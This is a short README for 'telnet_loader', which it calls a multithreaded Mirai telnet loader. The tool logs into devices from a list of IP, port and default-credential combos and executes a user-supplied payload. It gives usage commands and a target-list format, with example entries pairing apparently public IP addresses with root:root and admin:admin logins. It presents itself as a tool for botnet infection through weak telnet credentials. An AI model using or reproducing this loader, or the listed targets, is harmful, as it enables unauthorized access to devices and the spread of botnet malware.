# telnet_loader
This is a multithreaded mirai telnet loader it connects to telenet combo/list and executes a user provided payload 


# Example usage:
  
  **python telnet_scan.py -l targets.txt -t 20 -c "whoami**
  
  **python telnet_scan.py -l targets.txt -t 5 -o results.txt**
---

Target file format (one per line):
  IP:PORT USER:PASSWORD
  
  18.181.177.7:23 root:root
  
  221.1.120.79:23 admin:admin
  
